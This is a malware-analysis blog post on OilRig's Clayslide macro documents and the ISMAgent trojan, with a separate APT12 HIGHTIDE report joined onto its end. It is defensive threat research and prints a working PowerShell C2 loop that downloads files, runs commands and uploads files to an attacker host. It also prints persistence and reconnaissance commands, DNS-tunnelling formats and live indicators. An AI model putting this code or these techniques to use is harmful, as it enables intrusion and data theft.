Symantec first reported on this group back in January 2017, detailing their operations and using a custom information stealing Trojan called ISMDoor.\\nIn July 2017, we observed an attack on a Middle Eastern technology organization that was also targeted by the OilRig campaign in August 2016. Initial inspection of this attack suggested this was again the OilRig campaign using their existing toolset, but further examination revealed not only new variants of the delivery document we named Clayslide, but also a different payload embedded inside it. In the past, we had primarily associated the OilRig campaign with using the Clayslide documents to deliver as a payload a Trojan we named Helminth; in this instance, the payload was instead a variant of the ISMDoor Trojan with significant modifications which we are now tracking as ISMAgent.\\nThe Attack\\nOn July 16, 2017, actors associated with the OilRig campaign sent emails to five different individuals within the targeted organization. All of the emails sent had the same subject, attachment filename, and attached Excel file (SHA256: 3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6).\\nWe identified the Excel file attached to the delivery email as a variant of the Clayslide delivery documents used by the OilRig campaign. A closer look revealed that although it was similar to previous Clayslide documents, it was also quite different in several aspects. Like the previous samples, it displays a worksheet titled “Incompatible” containing a banner that shows a fake compatibility warning message (Figure 1). The message is an attempt to trick the user into clicking the “Enable Content” button, which would run a malicious macro embedded within the Excel file\\nFigure 1 Incompatible message attempting to trick the victim into enabling macros\\nThe macro within the delivery document will unhide and display a new worksheet that contains a fake invoice for Citrix products, as seen in Figure 2. This fake invoice acts as a decoy document to minimize the user’s suspicions that any malicious activity occurred.\\nFigure 2 Decoy document opened to minimize suspicions of compromise\\nWhile the macro displays the decoy invoice spreadsheet, it silently runs malicious code in the background to install its payload. The malicious code starts by concatenating several base64 encoded strings into a single variable. As you can see in the following code snippet, the variable name “Paltofp1” suggests that the author of this code may want our attention:\\nThe macro then writes the concatenated base64 encoded data to the file %PUBLIC%\\\\Libraries\\\\B642.txt. It then reads in the “B642.txt” file and decodes the data, which it will save to the file %PUBLIC%\\\\Libraries\\\\servicereset.exe (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9). The servicereset.exe file is the payload of this attack, which is a variant of ISMDoor that we track as ISMAgent.\\nThe script then creates a file named %PUBLIC%\\\\Libraries\\\\OfficeServicesStatus.vbs which contains a VBScript that will execute the “servicereset.exe” file using the command line. Lastly, as a persistence mechanism, a scheduled task named “OfficeServicesStatus” will be created, set to run every three minutes, as seen in Figure 3.\\nFigure 3 Scheduled task created by the macro within the delivery document\\nAn Iterative Task\\nWhile hunting for other samples similar to the one observed in the attack against the technology organization, we discovered yet another variant of Clayslide (SHA256: 5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902). This sample was dated June 2017, a month older than the newest version containing ISMAgent. Based upon timestamping and similarities with both the original Clayslide documents as well as the newest ISMAgent loaded ones, we believe this June 2016 sample to be an iterative version of Clayslide.\\nThe June 2017 sample of Clayslide contained the same OfficeServicesStatus.vbs file found in the ISMAgent Clayslide document, but instead of having the payload embedded in the macro as segregated base64 strings that would be concatenated, this variant obtained its payload from multiple cells within the “Incompatible” worksheet. This technique was observed in previous Clayslide documents to access the script variant of the Helminth Trojan in earlier OilRig attacks.\\nAlso, the June 2017 sample contained artifacts observed in previous Clayslide documents as documented in a blog post we published in April. Specifically, we found this comment:\\nsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html\\n1\\nsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html\\nalong with the following common function names within the macro code:\\nPrivate Sub Workbook_Open()\\nCall fireeye_Init\\nCall fireeye_ShowHideSheets\\nEnd Sub\\n1234\\nPrivate Sub Workbook_Open()\\xa0\\xa0\\xa0\\xa0 Call fireeye_Init\\xa0\\xa0\\xa0\\xa0 Call fireeye_ShowHideSheets End Sub\\nAlthough structurally the document was more similar to the originally discovered Clayslide documents, this June 2017 sample was designed to load ISMAgent instead of Helminth. We do not have targeting details for this sample, although the decoy document contained a similar theme to the newest Clayslide document, displaying vendor related information (Figure 4).\\nFigure 4 Decoy document\\nA table displaying the differences in each variant of Clayslide is below:\\nOriginal Clayslide\\nJune Clayslide\\nNewest Clayslide\\nHelminth\\nX\\nISMAgent\\nX\\nX\\nOfficeServicesStatus\\nX\\nX\\nBase64 in multiple cells\\nX\\nX\\nSource code comment\\nX\\nX\\nTable 1 Comparison of Clayslide versions\\nThe payload (SHA256: 52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9) delivered in the June 2016 attack is a variant of the recent ISMDoor versions that use DNS tunneling for its C2 communications. On May 1, 2017, Arbor Networks published research on ISMDoor using DNS tunneling to communicate with its C2 server, which is nearly identical to the DNS tunneling the payload of this attack carries out. Due to considerable differences and evidence of potentially different authors between the previous ISMDoor samples and this newly discovered variant, we are tracking this new variant as ISMAgent.\\nOn-demand Configuration\\nThe ISMAgent tool comes with a default configuration that specifies the C2 domain and the number of minutes between further attempts to execute the tool. However, an actor can use command line arguments to create a new ISMAgent sample that is configured with a specified C2 domain and a specified number of minutes to automatically execute the Trojan. The following command line arguments are supported:\\nArgument\\nDescription\\n-c\\nConfigures a second domain to use for C2 communications\\n-m\\nConfigures the number of minutes that a scheduled task should execute the payload\\nTable 2 Command line options available in ISMAgent for configuration\\nIf the Trojan is executed with these arguments, the Trojan will read its own file data in, and search for two strings of characters within the data that it will overwrite with the configured settings. The Trojan searches for a string of “^” characters that it will overwrite with the C2 domain provided via the “-c” argument, and it searches for the string “%%%%” that it will replace with the number of minutes provided via the “-m” argument. The “%%%%” string exists within the following larger string, that the Trojan uses as a command to execute in order to create a scheduled task named “TimeUpdate” to execute the payload after the specified number of minutes passes:\\ncmd /c schtasks /query /tn TimeUpdate &gt; NUL 2&gt;&amp;1 || schtasks /create /sc minute /mo %%%% /tn TimeUpdate /tr \\\\\"\\\\\\\\\\\\\"\\n1\\ncmd /c schtasks /query /tn TimeUpdate &gt; NUL 2&gt;&amp;1 || schtasks /create /sc minute /mo %%%% /tn TimeUpdate /tr \\\\\"\\\\\\\\\\\\\"\\nCommand and Control\\nThe Trojan is able to use two mechanisms to communicate with its C2 server: HTTP requests and DNS tunneling. The DNS tunneling protocol found in this payload is remarkably similar to recent ISMDoor samples, as documented in Arbor Networks’ research. Similar message handling is found in both ISMAgent and ISMDoor, in addition to the existence of strings in both samples, such the hardcoded IPv6 values. The similarities may allow for backward compatibility between ISMAgent and ISMDoor C2 infrastructure. In the payloads themselves, a number of differences exist, enough that in essence they appear to be different tools.\\nRegardless of the communications method used, the Trojan will parse the received data from the C2 server for a GUID field that the Trojan will use as a unique identifier, as well as commands the Trojan should run on the compromised system:\\n[GUID provided by C2]#command#[URL to download file to system]#[command to execute via cmd.exe]#[path to filename to upload to C2]\\n1\\n[GUID provided by C2]#command#[URL to download file to system]#[command to execute via cmd.exe]#[path to filename to upload to C2]\\nHTTP C2 Communications\\nISMAgent prioritizes HTTP as its mechanism to communicate with the C2 server, but if it is unable to reach the C2 server it will switch to the DNS tunneling mechanism. To carry out its HTTP C2 communications, the Trojan prepends “www.” to the configured C2 domain and issues a DNS query to resolve this domain. The Trojan will use the resolved IP address as the host in the HTTP beacon request.\\nFor instance, the sample used in this attack was configured to use ntpupdateserver[.]com for its C2 server. The HTTP C2 process would attempt to resolve the domain “www.ntpupdateserver[.]com”, which resolved to 142.54.179[.]90, so the Trojan would use the string “http:/w” as the basis of the C2 URL.\\xa0 The initial beacon sent from the Trojan to the C2 server using a URL structured in the following way:\\nhttp://[IP of C2 domain]/action2/[base64 encoded hostname\\\\username]\\n1\\nhttp://[IP of C2 domain]/action2/[base64 encoded hostname\\\\username]\\nThe C2 server will respond to this request with a command string using the previously mentioned format. During the attack on the technology organization,\\xa0we observed the C2 server issuing the following command:\\n2983b983-0acd-42db-9d86-0b096af5f369#command##systeminfo &amp;&amp; ipconfig /all &amp;&amp; net user &amp;&amp; net user /domain &amp;&amp; net group /domain &amp;&amp; tasklist &amp;&amp; net stat -an &amp;&amp; net use#\\n1\\n2983b983-0acd-42db-9d86-0b096af5f369#command##systeminfo &amp;&amp; ipconfig /all &amp;&amp; net user &amp;&amp; net user /domain &amp;&amp; net group /domain &amp;&amp; tasklist &amp;&amp; net stat -an &amp;&amp; net use#\\nIf the C2 server provides a command to execute on the system, the Trojan executes it using cmd.exe and writes the output to %TEMP%\\\\runlog[random number].tmp. The Trojan will read this runlog file and send it to the C2 server via an HTTP POST request to a URL structured as follows:\\nhttp://[IP of C2 domain]/response/[base64 encoded hostname\\\\username]/[GUID provided by C2]\\n1\\nhttp://[IP of C2 domain]/response/[base64 encoded hostname\\\\username]/[GUID provided by C2]\\nThe HTTP POST request contains an anomalous boundary value of “myboundary” and hardcoded filename value of “a.a”, as seen below, which may be used to generate detection signatures for this behavior:\\nPOST /response/[redacted]/2983b983-0acd-42db-9d86-0b096af5f369 HTTP/1.1\\nHost: 142.54.179.90\\nContent-Type: multipart/form-data; boundary=myboundary\\nUser-Agent: Firefox\\nContent-Length: 3868\\nCache-Control: no-cache\\n--myboundary\\nContent-Type: application/octet-stream;charset=UTF-8\\nContent-Disposition: form-data; name=\"file\"; filename=\"a.a\"\\n[output of command prompt]\\n12345678910111213\\nPOST /response/[redacted]/2983b983-0acd-42db-9d86-0b096af5f369 HTTP/1.1 Host: 142.54.179.90 Content-Type: multipart/form-data; boundary=myboundary User-Agent: Firefox Content-Length: 3868 Cache-Control: no-cache\\n--myboundary Content-Type: application/octet-stream;charset=UTF-8 Content-Disposition: form-data; name=\"file\"; filename=\"a.a\"\\n[output of command prompt]\\nWhile we did not observe the C2 server attempting to run additional commands via ISMAgent, we were able to analyze the Trojan itself to determine the functionality of its available commands. If the command string contains a URL to download a file to the system, the Trojan will simply use the URLDownloadToFileA function to download and save the file to the target system in the %TEMP% folder. If the C2 server provides a path to a file it wishes to upload from the system, the Trojan will open the file, read its contents, and then upload its contents via an HTTP POST to the following URL:\\nhttp://[IP of C2 domain]/upload/[base64 encoded hostname\\\\username]/[GUID provided by C2]\\n1\\nhttp://[IP of C2 domain]/upload/[base64 encoded hostname\\\\username]/[GUID provided by C2]\\nDNS Tunneling for C2\\nISMAgent uses its DNS tunneling technique for C2 as a backup to its HTTP capability. This mechanism supports the same command message structure and even handles the commands in the same manner. The Trojan sends data to the C2 server via DNS queries by encoding data and using the encoded string as a subdomain of an actor owned domain. The C2 server can send data to the Trojan by resolving the DNS queries to IPv6 addresses that the Trojan treats as hexadecimal data.\\nTo carry out its DNS C2 communications, the Trojan will issue DNS queries to the C2 domain to obtain the AAAA records associated with the domain. The Trojan starts this process by creating a unique GUID and appending it to the string “n.n.c.” to create a subdomain to query in the following format:\\nn.n.c.[session value based on GUID].[c2 domain]\\n(ex: n.n.c.303E5CF0A861479B80E2.ntpupdateserver.com)\\n12\\nn.n.c.[session value based on GUID].[c2 domain] (ex: n.n.c.303E5CF0A861479B80E2.ntpupdateserver.com)\\nTo respond to this beacon, the C2 domain’s name server will respond to this query with a hardcoded IPv6 value of a67d:0db8:a2a1:7334:7654:4325:0370:2aa3. This value acts as an acknowledgement of the beacon. The Trojan will then base64 encode the HTTP C2 URL it was using and will send this data to the C2 by constructing and issuing the following DNS query:\\n[base64 encoded data].[iterating sequence number].d.[session value based on GUID].[c2 domain]\\n(ex: aHR0cDovLzE0M.0.d.303E5CF0A861479B80E2.ntpupdateserver.com)\\n12\\n[base64 encoded data].[iterating sequence number].d.[session value based on GUID].[c2 domain] (ex: aHR0cDovLzE0M.0.d.303E5CF0A861479B80E2.ntpupdateserver.com)\\nThe Trojan splits up the base64 encoded data across several DNS queries, which we believe the C2 domain’s name server pieces together using the supplied sequence numbers. The name server will respond to each of these DNS queries with another hardcoded IPv6 value of a67d:0db8:85a3:4325:7654:8a2a:0370:7334 to notify the Trojan that it has received the data. After all of the data is successfully sent via DNS requests, the Trojan will send a final DNS query that has the following structure to notify the C2 server that it has completed its data transfer:\\nn.[iterating sequence number].f.[session value based on GUID].[c2 domain]\\n(ex: n.8.f.303E5CF0A861479B80E2.ntpupdateserver.com)\\n12\\nn.[iterating sequence number].f.[session value based on GUID].[c2 domain] (ex: n.8.f.303E5CF0A861479B80E2.ntpupdateserver.com)\\nAfter notifying the C2 server that the data transfer has completed, the Trojan may issue additional DNS queries to notify it is ready to receive data back from the C2 server using the following domain name structure:\\nwww.[iterating sequence number].r.[session value based on GUID].[c2 domain]\\n1\\nwww.[iterating sequence number].r.[session value based on GUID].[c2 domain]\\nThe DNS server will then respond to these DNS queries with additional IPv6 addresses that the Trojan will treat as hexadecimal data as described by Arbor Networks.\\nInfrastructure\\nThe ISMAgent payload embedded inside the newest variant of Clayslide used the C2 domain ntpupdateserver[.]com. The primary second-level domain has no IP resolution, instead relying on www.ntpupdateserver[.]com for resolution then two specific subdomains of ns1.ntupdateserver[.]com and ns2.ntpupdateserver[.]com as the actual DNS C2 handler. The ISMAgent payload embedded inside the June version used a completely different C2 domain at Microsoft-publisher[.]com, but used the exact same domain name structure. Lastly, we were able to identify a third sample of ISMAgent leveraging another unique C2 domain, adobeproduct[.]com.\\nNtpupdateserver[.]com\\nMicrosoft-publisher[.]com\\nAdobeproduct[.]com\\n123\\nNtpupdateserver[.]com Microsoft-publisher[.]com Adobeproduct[.]com\\nFigure 5 Primary C2 domains for ISMAgent\\nPivoting from the WHOIS registrant email address of paul.mcalister[at]mail.com revealed four additional highly suspect domains:\\nfireeyeupdate[.]com\\nchrome-dns[.]com\\ntatavpnservices[.]com\\nmiedafire[.]com\\n1234\\nfireeyeupdate[.]com\\nchrome-dns[.]com tatavpnservices[.]com miedafire[.]com\\nPivoting on the WHOIS phone number we found two additional domains. These are registered with the same Registrar, have the same WHOIS address, but the registrant name “bolips\\xa0Angelio” and email address bolips[at]outlook.com.\\ncache-service[.]net\\nlevel3-resolvers[.]net\\n12\\ncache-service[.]net level3-resolvers[.]net\\nThematically, these domains follow the pattern of ISMAgent and OilRig C2 domain names, abusing typo-squatting techniques in attempts to appear as legitimate domains. Each of these additional domains had the same structure as the three ISMAgent C2 domains, with no IP resolution on the primary second-level domain containing the www, ns1, and ns2 subdomains. Based off the same registrant email address and domain name structure, it is highly probable these other domains are also part of the ISMAgent infrastructure as C2 servers.\\nLastly, we identified another ISMAgent sample using the C2 domain of adobeproduct[.]com, which again fits thematically and was also found to have the www, ns1, and ns2 subdomains attached to it.\\nThese findings are diagrammed below:\\nFigure 6 ISMAgent C2 Infrastructure\\nISMAgent vs. ISMDoor\\nOn the surface, the ISMAgent payload appears similar to the ISMDoor payload, sharing functionality such as a specific DNS tunneling protocol. However, closer analysis shows there are enough differences between the two payloads that justifies tracking ISMAgent as its own tool with its own name.\\nFirst, all known ISMDoor payloads using DNS tunneling were created for 64-bit architectures, while all known ISMAgent are x86 only. The most recent ISMDoor payloads using DNS tunneling have abandoned HTTP as a C2 communications method compared to earlier ISMDoor samples, whereas ISMAgent uses HTTP as the primary method and DNS tunneling as a secondary method to communicate with its C2 server.\\nAlso, while the DNS tunneling protocol is the same, the messages within the transmitted encoded data differs dramatically. After the initial “n.n.c.” beacon, ISMAgent sends the HTTP C2 URL as the data via the DNS tunneling protocol to send a beacon to its C2. During our analysis, we observed the sample used in this attack sending the following data immediately after the initial beacon:\\nhttp://142.54.179[.]90/action2/T0tPODczODAyNTg1NTk4XDVoNkdkTjY5YTR0S0g%3d||\\n1\\nhttp://142.54.179[.]90/action2/T0tPODczODAyNTg1NTk4XDVoNkdkTjY5YTR0S0g%3d||\\nComparatively, ISMDoor sends a much more involved series of messages to the C2 server in order to get a command. The following is a sequence of messages sent from the ISMDoor Trojan to its C2 server via the DNS tunneling protocol, the last message (“M:GAC?”) resulting in a command for the Trojan to run:\\n1.\\tM:CC?\\n2.\\tM:ME?appId=-1&amp;message=Executed Successfully\\n3.\\tM:AV?appId=-1&amp;uniqueId=00000000-0000-0000-0000-000000000000\\n4.\\tM:AV?appId=[appId provided by C2]&amp;uniqueId=[GUID provided by C2]\\n5.\\tM:GAC?appId=[appId provided by C2]\\n12345\\n1. M:CC? 2. M:ME?appId=-1&amp;message=Executed Successfully 3. M:AV?appId=-1&amp;uniqueId=00000000-0000-0000-0000-000000000000 4. M:AV?appId=[appId provided by C2]&amp;uniqueId=[GUID provided by C2] 5. M:GAC?appId=[appId provided by C2]\\nLastly, the commands available within ISMAgent and ISMDoor are very different. As mentioned previously, ISMAgent has a far more limited, but flexible command set, allowing an adversary to upload and download files, in addition to command execution via command prompt. The most recent version of ISMDoor (v 10.0.192 SHA256: aa52dcaf6df43c6aa872fe0f73725f61e082d32c33fc976741d4eca17679533d) on the other hand, has a more comprehensive yet more rigid command set:\\nChangeAliveSeconds\\nChangeAddress\\nSI\\nGetConfig\\nRunNewVersion\\nrestart\\nremove\\nFastAlive\\nExecuteKL\\nGetVersion\\nPauseUpload\\nResumeUpload\\nPauseDownload\\nResumeDownload\\nPWS\\nImmediateResetRam\\n12345678910111213141516\\nChangeAliveSeconds ChangeAddress SI GetConfig RunNewVersion restart remove FastAlive ExecuteKL GetVersion PauseUpload ResumeUpload PauseDownload ResumeDownload PWS ImmediateResetRam\\nFrom Helminth to ISMAgent\\nDuring our data collection process, we discovered a Clayslide delivery document (SHA256: ca8cec08b4c74cf68c71a39176bfc8ee1ae4372f98f75c892706b2648b1e7530) from September 2016 containing a payload that appeared to be the Helminth script variant as found in other Clayslide documents, but upon further examination was wholly different. The macro within this Clayslide documents obtains a PowerShell script from a cell in the “Incompatible” worksheet, much like previous samples. The macro then saves a VBScript to %PUBLIC%\\\\Libraries\\\\LicenseCheck.vbs to run this PowerShell script every 3 minutes.\\nLike the Helminth script variants, this PowerShell script is a malicious payload that uses both HTTP requests and DNS tunneling to interact with its C2 server. However, the HTTP requests and the protocol employed to perform DNS tunneling differs dramatically from Helminth scripts installed by all other known Clayslide samples. The HTTP requests and DNS tunneling protocol found in this PowerShell script are instead identical to ISMAgent.\\nThe C2 domain used for this script was mslicensecheck[.]com, which had previously been reported by LogRhythm in their OilRig whitepaper. Interestingly, it was the only domain associated with OilRig that did not have an IP resolution at its second-level, much like the ISMAgent samples.\\nThe “doIt” function within the PowerShell script, seen in Figure 7, is responsible for initiating the C2 communications, as well as parsing the data provided by the C2 server to run the appropriate commands. This function uses the strings “/action2/”, “/response/” and “/upload/” within the C2 URLs when using HTTP to communicate with the C2 server. This behavior and these strings were also observed in the ISMAgent C2 behavior. The “doIt” function also shows that the C2 server will respond with data structured the same way as ISMAgent, using “#” as a delimiter and various offsets such as offset 0 used in subsequent requests with the C2, offset 2 specifying a URL to download a file from, offset 3 specifying a command to execute using command-prompt, and offset 4 specifying a path to a file to upload to the C2 server.\\nfunction doIt(){\\ntry{\\nwhile($true){\\n$res = get($ha+\"/action2/\"+$id)\\n$p = $res.split(\\'#\\')\\nif ($p.Length -lt 5) { break }\\n$res = $tmp+$p[0]\\n$u = $ha+\"/response/\"+$id+\"/\"+$p[0]\\nif ($p[2] -ne \\'\\') {\\n$name= $p[2].SubString($p[2].LastIndexOf(\"/\")+1)\\ndownload $p[2] ($tmp+$name)\\n[IO.File]::WriteAllText($res,\"done\", [System.Text.Encoding]::Unicode)\\n}\\nif($p[3] -ne \\'\\'){\\n$p[3] | cmd.exe &gt;&gt; $res\\n}\\nif($p[4] -ne \\'\\'){\\nupload $u.Replace(\"/response/\",\"/upload/\") $p[4]\\n}\\nupload $u $res\\n[IO.File]::Delete($res)\\n}\\n} catch {}\\n}\\n123456789101112131415161718192021222324\\nfunction doIt(){\\xa0\\xa0try{\\xa0\\xa0 while($true){\\xa0\\xa0\\xa0\\xa0$res = get($ha+\"/action2/\"+$id)\\xa0\\xa0\\xa0\\xa0$p = $res.split(\\'#\\')\\xa0\\xa0\\xa0\\xa0if ($p.Length -lt 5) { break }\\xa0\\xa0\\xa0\\xa0$res = $tmp+$p[0]\\xa0\\xa0\\xa0\\xa0$u = $ha+\"/response/\"+$id+\"/\"+$p[0]\\xa0\\xa0\\xa0\\xa0if ($p[2] -ne \\'\\') {\\xa0\\xa0\\xa0\\xa0 $name= $p[2].SubString($p[2].LastIndexOf(\"/\")+1)\\xa0\\xa0\\xa0\\xa0 download $p[2] ($tmp+$name)\\xa0\\xa0\\xa0\\xa0 [IO.File]::WriteAllText($res,\"done\", [System.Text.Encoding]::Unicode)\\xa0\\xa0\\xa0\\xa0}\\xa0\\xa0\\xa0\\xa0if($p[3] -ne \\'\\'){\\xa0\\xa0\\xa0\\xa0 $p[3] | cmd.exe &gt;&gt; $res\\xa0\\xa0\\xa0\\xa0}\\xa0\\xa0\\xa0\\xa0if($p[4] -ne \\'\\'){\\xa0\\xa0\\xa0\\xa0 upload $u.Replace(\"/response/\",\"/upload/\") $p[4]\\xa0\\xa0\\xa0\\xa0}\\xa0\\xa0\\xa0\\xa0upload $u $res \\xa0\\xa0\\xa0\\xa0[IO.File]::Delete($res)\\xa0\\xa0 }\\xa0\\xa0} catch {} }\\nFigure 7 The ‘doIt’ function within the PowerShell script handles C2 interaction and functionality\\nThe commonalities between this PowerShell script and ISMAgent do not stop there. The HTTP requests to the C2 server use the exact same URL structure. For instance, the payload generates a URL using the following line of code, which results in a base64 encoded string that contains [hostname/username]:\\n$id=[Convert]::ToBase64String($Enc.GetBytes([System.Net.Dns]::GetHostEntry([string]\"localhost\").HostName+\"/\"+$env:username)).Replace(\\'=\\',\\'%3d\\').Replace(\"/\",\"%2f\").Replace(\"+\",\"%2b\")\\n1\\n$id=[Convert]::ToBase64String($Enc.GetBytes([System.Net.Dns]::GetHostEntry([string]\"localhost\").HostName+\"/\"+$env:username)).Replace(\\'=\\',\\'%3d\\').Replace(\"/\",\"%2f\").Replace(\"+\",\"%2b\")\\nAlso, as seen in the code above, the PowerShell script makes sure the base64 encoded data used is safe to use in an HTTP URL, by replacing the characters “=”, “/” and “+” characters with hexadecimal equivalent. The ISMAgent payloads also performed the exact same replacement, as seen in the portion of code in Figure 8.\\nFigure 8 Code within ISMAgent payload that overlaps character replacement HTTP communications functionality within PowerShell script\\nThe DNS tunneling protocol within the PowerShell script is the same as the ISMAgent payload, which can be visualized by the following beacon sent from the PowerShell script:\\nn.n.c.55957d20569c43c9a401e5d446b92b9e.mslicensecheck.com\\n1\\nn.n.c.55957d20569c43c9a401e5d446b92b9e.mslicensecheck.com\\nTo facilitate the DNS tunneling functionality, the PowerShell script replaces the “=”, “/” and “+” characters within the base64 data sent to the C2 server within the subdomains of DNS queries. However, DNS queries cannot include the “%” character, so it uses the following line of code to replace them with “-“, “-s-“ and “-p-“ instead:\\n$b64=[Convert]::ToBase64String($dt).Replace(\\'=\\',\\'-\\').Replace(\"/\",\"-s-\").Replace(\"+\",\"-p-\")\\n1\\n$b64=[Convert]::ToBase64String($dt).Replace(\\'=\\',\\'-\\').Replace(\"/\",\"-s-\").Replace(\"+\",\"-p-\")\\nThis functionality is again replicated within the ISMAgent payload for its DNS tunneling functionality, as shown in Figure 9.\\nFigure 9 Code within ISMAgent payload that overlaps character replacement within DNS tunneling functionality within PowerShell script\\nConclusion\\nThe OilRig campaign has repeatedly demonstrated a willingness and desire to be iterative in their toolset, while maintaining some level of similarities over time. In this scenario, we were able to directly observe this type of behavior, while also implement a tool thought to be previously unrelated to OilRig. With the inclusion of ISMAgent within the OilRig toolset, we are beginning to see stronger relationships between the various documented groups operating in the Middle East. This region has proven to be a hot bed of espionage motivated activity over the last couple of years, and there appear to be no signs of this changing. As our research continues, our goal will be to generate even better understandings of the true extent of the various operations in this region and the relationships between them.\\nPalo Alto Networks customers are protected and may learn more via the following:\\nSamples are classified as malicious by WildFire and Traps prevents their execution\\nDomains and IPs have been classified as malicious and IPS signatures generated\\nAutoFocus users may learn more via the ISMAgent and Clayslide tags\\nIndicators of Compromise\\nClayslide delivering ISMAgent\\n3eb14b6705179590f0476d3d3cbd71665e7c1935ecac3df7b876edc9bd7641b6\\n5ac939a5426db8614165bd8b6a02d3e8d9f167379c6ed28025bf3b37f1aea902\\nISMAgent payloads\\nbbfc05177e5e29b3c8c4ef0148969d07e6239140da5bff57473c32409e76c070\\n52366b9ab2eb1d77ca6719a40f4779eb302dca97a832bd447abf10512dc51ed9\\naf4d8604d0cd09b8dc01dbafc33c6d240d356cad366f9917192a2725e0121a0d\\nISMAgent C2\\nAdobeproduct[.]com\\nntpupdateserver[.]com\\nmicrosoft-publisher[.]com\\nRelated infrastructure\\nMiedafire[.]com\\ntatavpnservices[.]com\\nchrome-dns[.]com\\nfireeyeupdate[.]com\\ncache-service[.]net\\nlevel3-resolvers[.]net\\nMslicensecheck[.]com\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I\\'m not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

APT12 is believed to be a cyber espionage group thought to have links to the Chinese People's Liberation Army. APT12's targets are consistent with larger People's Republic of China (PRC) goals. Intrusions and campaigns conducted by this group are in-line with PRC goals and self-interest in Taiwan. Additionally, the new campaigns we uncovered further highlight the correlation between APT groups ceasing and retooling operations after media exposure, as APT12 used the same strategy after compromising the New York Times in Oct 2012. Much like Darwin’s theory of biological evolution, APT12 been forced to evolve and adapt in order to maintain its mission.\\nThe new campaign marks the first APT12 activity publicly reported since Arbor Networks released their blog “Illuminating The Etumbot APT Backdoor.” FireEye refers to the Etumbot backdoor as RIPTIDE. Since the release of the Arbor blog post, FireEye has observed APT12 use a modified RIPTIDE backdoor that we call HIGHTIDE. This is the second time FireEye has discovered APT12 retooling after a public disclosure. As such, FireEye believes this to be a common theme for this APT group, as APT12 will continue to evolve in an effort to avoid detection and continue its cyber operations.\\nFireEye researchers also discovered two possibly related campaigns utilizing two other backdoors known as THREEBYTE and WATERSPOUT. Both backdoors were dropped from malicious documents built utilizing the “Tran Duy Linh” exploit kit, which exploited CVE-2012-0158. These documents were also emailed to organizations in Japan and Taiwan. While APT12 has previously used THREEBYTE, it is unclear if APT12 was responsible for the recently discovered campaign utilizing THREEBYTE. Similarly, WATERSPOUT is a newly discovered backdoor and the threat actors behind the campaign have not been positively identified. However, the WATERSPOUT campaign shared several traits with the RIPTIDE and HIGHTIDE campaign that we have attributed to APT12.\\nBackground\\nFrom October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server. RIPTIDE’s first communication with its C2 server fetches an encryption key, and the RC4 encryption key is used to encrypt all further communication.\\nFigure 1: RIPTIDE HTTP GET Request Example\\nIn June 2014, Arbor Networks published an article describing the RIPTIDE backdoor and its C2 infrastructure in great depth. The blog highlighted that the backdoor was utilized in campaigns from March 2011 till May 2014.\\nFollowing the release of the article, FireEye observed a distinct change in RIPTIDE’s protocols and strings. We suspect this change was a direct result of the Arbor blog post in order to decrease detection of RIPTIDE by security vendors. The changes to RIPTIDE were significant enough to circumvent existing RIPTIDE detection rules. FireEye dubbed this new malware family HIGHTIDE.\\nHIGHTIDE Malware Family\\nOn Sunday August 24, 2014 we observed a spear phish email sent to a Taiwanese government ministry. Attached to this email was a malicious Microsoft Word document (MD5: f6fafb7c30b1114befc93f39d0698560) that exploited CVE-2012-0158. It is worth noting that this email appeared to have been sent from another Taiwanese Government employee, implying that the email was sent from a valid but compromised account.\\nFigure 2: \\xa0APT12 Spearphishing Email\\nThe exploit document dropped the HIGHTIDE backdoor with the following properties:\\nMD5\\n6e59861931fa2796ee107dc27bfdd480\\nSize\\n75264 bytes\\nComplie Time\\n2014-08-23 08:22:49\\nImport Hash\\nead55ef2b18a80c00786c25211981570\\nThe HIGHTIDE backdoor connected directly to 141.108.2.157. If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:\\nUser Agent\\nFormat and structure of the HTTP Uniform Resource Identifier (URI)\\nFigure 3: HIGHTIDE GET Request Example\\nSimilar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158. FireEye observed APT12 deliver these exploit documents via phishing emails in multiple cases. Based on past APT12 activity, we expect the threat group to continue to utilize phishing as a malware delivery method.\\nMD5\\nFile Name\\nExploit\\n73f493f6a2b0da23a79b50765c164e88\\n議程最新修正及注意事項.doc\\nCVE-2012-0158\\nf6fafb7c30b1114befc93f39d0698560\\n0824.1.doc\\nCVE-2012-0158\\neaa6e03d9dae356481215e3a9d2914dc\\n簡易名冊0全國各警察機關主官至分局長.doc\\nCVE-2012-0158\\n06da4eb2ab6412c0dc7f295920eb61c4\\n附檔.doc\\nCVE-2012-0158\\n53baedf3765e27fb465057c48387c9b6\\n103年第3屆通訊錄.doc\\nCVE-2012-0158\\n00a95fb30be2d6271c491545f6c6a707\\n2014 09 17 Welcome Reception for Bob and Jason_invitation.doc\\nCVE-2012-0158\\n4ab6bf7e6796bb930be2dd0141128d06\\n產諮會_Y103(2)委員會_從東協新興國家崛起(0825).doc\\nCVE-2012-0158\\nFigure 4: Identified exploit documents for HIGHTIDE\\nWhen the file is opened, it drops HIGHTIDE in the form of an executable file onto the infected system.\\nRIPTIDE and HIGHTIDE differ on several points: executable file location, image base address, the User-Agent within the GET requests, and the format of the URI.

